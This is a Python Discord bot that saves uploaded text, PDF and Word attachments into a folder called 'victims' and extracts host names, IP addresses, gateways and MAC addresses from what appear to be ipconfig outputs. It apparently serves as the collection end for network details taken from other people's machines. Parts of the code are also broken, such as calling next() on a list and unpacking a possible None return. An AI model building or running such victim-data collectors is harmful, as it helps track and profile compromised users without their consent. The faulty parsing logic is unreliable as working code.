import discord
import os
import json
import re

# Read the token from config.json
with open('config.json', 'r') as config_file:
    config_data = json.load(config_file)
    TOKEN = config_data['token']

intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.message_content = True

client = discord.Client(intents=intents)

# Create a 'victims' directory if it doesn't exist
if not os.path.exists('victims'):
    os.makedirs('victims')

@client.event
async def on_ready():
    print('We have logged in as {0.user}'.format(client))

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    # Check if the message has any attachments
    if message.attachments:
        for attachment in message.attachments:
            # Get the file extension (e.g., '.txt', '.pdf')
            file_extension = os.path.splitext(attachment.filename)[1].lower()

            # Check if the file extension is associated with a text document
            text_document_extensions = ['.txt', '.pdf', '.docx']
            if file_extension in text_document_extensions:
                # Construct the file path within the 'victims' directory
                file_path = os.path.join('victims', attachment.filename)

                # Download and save the attachment
                await attachment.save(file_path)
                print(f"Downloaded attachment: {file_path}")

                # Process the file and set the filename based on the 'Host Name' line
                new_filename, ipv4_addresses, ipv6_addresses = await process_file(file_path)

                if new_filename:
                    # Construct the new file path for the renamed file
                    new_file_path = os.path.join('victims', new_filename)

                    # Delete the original file
                    os.remove(file_path)
                    print(f"Removed original file: {file_path}")

                    # Rename the file to the new filename
                    # os.rename(file_path, new_file_path)
                    # print(f"Renamed file to: {new_file_path}")

                    # Send a message with the first line and addresses
                    # message_content = [lines[0].strip()]
                    # message_content.append("IPv4 Addresses:")
                    # message_content.extend(ipv4_addresses)
                    # message_content.append("IPv6 Addresses:")
                    # message_content.extend(ipv6_addresses)

                    # await message.channel.send('\n'.join(message_content))

    # Access the message content
    # message_content = message.content

    # print(f"Received message: {message_content}")
    # if message_content.startswith('hello'):
      #   print("Detected $hello command")
      #   await message.channel.send('World!')

async def process_file(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()

            # Initialize the new filename with a default value
            new_filename = "info.txt"

            # Initialize lists for IPv4 and IPv6 addresses
            ipv4_addresses = []
            ipv6_addresses = []

            # Initialize variables to store the host name, default gateway, and active MAC address
            host_name = None
            default_gateway = None
            active_mac = None

            # Iterate through the lines to find addresses, host name, default gateway, and active MAC address
            for line in lines:
                if line.startswith("   Host Name . . . . . . . . . . . . : "):
                    # Extract the host name from the line
                    host_name = line.replace("   Host Name . . . . . . . . . . . . : ", "").strip()

                if line.startswith("   Default Gateway . . . . . . . . . : "):
                    # Extract the default gateway address
                    default_gateway = line.replace("   Default Gateway . . . . . . . . . : ", "").strip()

                if line.startswith("   IPv4 Address"):
                    ipv4_address = line.split(":")[1].strip()
                    ipv4_addresses.append(ipv4_address)
                elif line.startswith("   IPv6 Address"):
                    # Extract the complete IPv6 address using regular expression
                    ipv6_address_match = re.search(r'IPv6 Address[.\s]+: ([\w:]+)', line)
                    if ipv6_address_match:
                        ipv6_address = ipv6_address_match.group(1).strip()
                        ipv6_addresses.append(ipv6_address)

                if default_gateway and line.strip() == default_gateway:
                    # Extract the active MAC address associated with the default gateway
                    active_mac_line = next(lines)
                    active_mac = active_mac_line.split(":")[1].strip()

            # If a host name is found, use it as the new filename
            if host_name:
                new_filename = f"{host_name}.txt"

            # Create a list to store lines for the new text file
            new_file_lines = []

            # Add the first line of the original file
            if lines:
                new_file_lines.append(lines[0].strip())

            # Add IPv4 addresses
            if ipv4_addresses:
                new_file_lines.append("IPv4 Addresses:")
                new_file_lines.extend(ipv4_addresses)

            # Add IPv6 addresses
            if ipv6_addresses:
                new_file_lines.append("IPv6 Addresses:")
                new_file_lines.extend(ipv6_addresses)

            # Add active MAC address
            if active_mac:
                new_file_lines.append(f"Active MAC Address: {active_mac}")

            if new_file_lines:
                # Construct the new file path for the text file within the subdirectory
                subdirectory_path = os.path.dirname(file_path)
                new_info_file_path = os.path.join(subdirectory_path, new_filename)

                # Write the selected lines to the new text file
                with open(new_info_file_path, 'w', encoding='utf-8') as info_file:
                    info_file.write('\n'.join(new_file_lines))

                print(f"Processed file and renamed to: {new_filename}")

                return new_filename, ipv4_addresses, ipv6_addresses
    except Exception as e:
        print(f"Error processing file: {str(e)}")


# Use 'TOKEN' without percent signs
client.run(TOKEN)